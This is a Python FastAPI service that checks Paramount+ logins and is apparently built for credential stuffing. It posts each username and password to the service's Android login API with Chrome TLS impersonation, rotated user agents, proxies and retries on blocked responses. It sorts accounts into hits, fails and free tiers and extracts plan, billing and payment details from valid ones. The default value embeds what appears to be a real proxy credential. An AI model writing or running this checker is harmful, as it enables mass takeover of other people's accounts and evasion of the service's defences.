import re
import secrets
import random
import urllib.parse
import time
from typing import Optional

import tls_client
from fastapi import FastAPI, HTTPException
from pydantic import BaseModel

app = FastAPI()

# ---------- Country map (include yours fully) ----------
COUNTRY_MAP = {
    "AF": "Afganistan 🇦🇫", "AX": "Åland Islands 🇫🇮", "AL": "Albania 🇦🇱", "DZ": "Algeria 🇩🇿",
    # ... (paste your complete map)
    "ZW": "Zimbabwe 🇿🇼"
}

# ---------- Input schema ----------
class CheckInput(BaseModel):
    username: str
    password: str
    proxy: Optional[str] = "core.eclipseproxy.com:3030:eclipse_Acho1234:3b8fe71d-eb2a-40b6-9cad-bbb1927b0e25"

# ---------- Helpers ----------
def parse_lr(source: str, left: str, right: str) -> str:
    try:
        start = source.index(left) + len(left)
        end = source.index(right, start)
        return source[start:end]
    except ValueError:
        return ""

def format_proxy(raw_proxy: str) -> Optional[str]:
    if not raw_proxy:
        return None
    try:
        userpass_match = re.search(r"^[^:]+:[^:]+:([^:]+:[^_]+(?:_.+)?)$", raw_proxy)
        ipport_match = re.search(r"^([^:]+:[^:]+)", raw_proxy)
        if userpass_match and ipport_match:
            return f"http://{userpass_match.group(1)}@{ipport_match.group(1)}"
    except Exception:
        pass
    return None

def get_random_user_agent() -> str:
    ua_list = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
    ]
    return random.choice(ua_list)

# ---------- Endpoint ----------
@app.post("/check")
def run_check(payload: CheckInput):
    device_id = secrets.token_hex(8).lower()
    user_agent = get_random_user_agent()
    proxy_url = format_proxy(payload.proxy)

    headers = {
        "Host": "www.intl.paramountplus.com",
        "Origin": "https://www.intl.paramountplus.com",
        "Referer": "https://www.intl.paramountplus.com/",
        "User-Agent": user_agent,
        "Accept": "application/json, text/plain, */*",
        "Accept-Language": "en-US,en;q=0.9",
        "Cache-Control": "max-age=0",
        "Cookie": "CBS_DEVICEID=",
        "Accept-Encoding": "gzip, deflate, br",
        "Traceparent": "00-c206720e0f5a4e1387706d69d577877c-10cc66f212114532-01",
        "Tracestate": "2321606@nr=0-2-2936348-766585785-10cc66f212114532----1763113514852",
        "Newrelic": "eyJ2IjpbMCwyXSwiZCI6eyJ0eSI6Ik1vYmlsZSIsImFjIjoiMjkzNjM0OCIsImFwIjoiNzY2NTg1Nzg1IiwidHIiOiJjMjA2NzIwZTBmNWE0ZTEzODc3MDZkNjlkNTc3ODc3YyIsImlkIjoiMTBjYzY2ZjIxMjExNDUzMiIsInRpIjoxNzYzMTEzNTE0ODUyLCJ0ayI6IjIzMjE2MDYifX0="
    }

    # Create TLS session (impersonate Chrome 120, HTTP/2)
    session = tls_client.Session(
        client_identifier="chrome_120",
        random_tls_extension_order=True
    )
    session.http2 = True

    # Helper with exponential backoff and retry on any failure
    def do_request(method, url, data=None, max_retries=10):
        delay = 1  # seconds
        for attempt in range(max_retries):
            try:
                if method.upper() == "POST":
                    response = session.post(
                        url,
                        headers=headers,
                        data=data,
                        proxy=proxy_url,
                        timeout_seconds=30
                    )
                else:
                    response = session.get(
                        url,
                        headers=headers,
                        proxy=proxy_url,
                        timeout_seconds=30
                    )
            except Exception as e:
                # On any exception (proxy, SSL, timeout), retry after delay
                if attempt == max_retries - 1:
                    raise HTTPException(status_code=500, detail=f"Request error after {max_retries} retries: {str(e)}")
                time.sleep(delay)
                delay *= 2  # exponential backoff
                continue

            status = response.status_code
            body = response.text

            # Only retry on these specific status codes (as in the workflow)
            if status in (500, 403, 406):
                if attempt == max_retries - 1:
                    # Log the response body for debugging
                    raise HTTPException(
                        status_code=500,
                        detail=f"Max retries exceeded. Last status: {status}, body: {body[:200]}"
                    )
                time.sleep(delay)
                delay *= 2
                continue

            # Success: return status and body
            return status, body

        # If we somehow exit loop, raise
        raise HTTPException(status_code=500, detail="Max retries exceeded without success.")

    # ----- Login -----
    login_url = "https://www.intl.paramountplus.com/apps-api/v2.1/androidphone/auth/login.json?locale=en-us&at=ABC74o%2B31mI%2F%2FzQ3GstOJMJJ%2FgdJGAU5PCKXsJ%2B%2BroG%2FyHi2O754P8Ojsak4Ev7LXck%3D"
    login_data = {"j_username": payload.username, "j_password": payload.password, "deviceId": device_id}
    login_data_str = urllib.parse.urlencode(login_data)

    status, body = do_request("POST", login_url, data=login_data_str)

    if "Invalid username/password pair" in body or '"status":400,"error":"Bad Request",' in body:
        return {"status": "FAIL"}
    if "userId" not in body:
        return {"status": "BAN/UNKNOWN"}

    # ----- Status -----
    status_url = "https://www.intl.paramountplus.com/apps-api/v3.0/androidphone/login/status.json?locale=en-us&at=ABAe6KaaPmQXoXXr2FS9yDys4wXLwooaEREtz0c6agC7vrQhjTY%2FYfp1dfSDtu9EbB0%3D"

    status, body2 = do_request("GET", status_url)

    if "NEW_FREE_PACKAGE" in body2 or '"planType":null,' in body2:
        return {"status": "FREE/CUSTOM"}

    country_code = parse_lr(body2, '"subscriptionCountry":"', '"')
    return {
        "status": "SUCCESS",
        "data": {
            "Country": COUNTRY_MAP.get(country_code, f"Unknown ({country_code})"),
            "Plan": parse_lr(body2, '"productName":"', '"'),
            "PlanType": parse_lr(body2, '"planType":"', '"'),
            "BillingPeriod": parse_lr(body2, '"billingCadence":"', '"'),
            "Package": parse_lr(body2, '"packageCode":"', '"'),
            "PaymentMethod": parse_lr(body2, '"packageSource":"', '"')
        }
    }

@app.get("/health")
def health():
    return {"status": "ok"}
